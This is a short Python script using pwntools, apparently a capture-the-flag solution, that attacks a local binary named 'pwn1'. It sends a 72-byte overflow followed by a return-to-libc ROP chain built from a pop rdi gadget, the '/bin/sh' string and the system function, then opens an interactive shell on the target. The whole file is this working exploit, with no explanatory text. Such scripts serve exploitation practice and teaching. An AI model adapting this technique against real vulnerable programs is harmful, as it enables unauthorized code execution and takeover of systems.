#!/usr/bin/env python3
from pwn import *
from struct import pack

p = process('./pwn1')

binary = ELF('./pwn1')
context.binary = binary
rop = ROP(binary)

libc = ELF('/usr/lib/libc.so.6')
libc.address = 0x7ffff7dc3000

pop_rdi_address = 0x400783
ret_address = 0x400784

rop.raw('A' * 72)
rop.raw(pop_rdi_address)
rop.raw(next(libc.search(b'/bin/sh')))
rop.raw(ret_address)
rop.raw(libc.symbols['system'])

p.recvuntil('buffer:')
p.sendline(rop.chain())
p.interactive()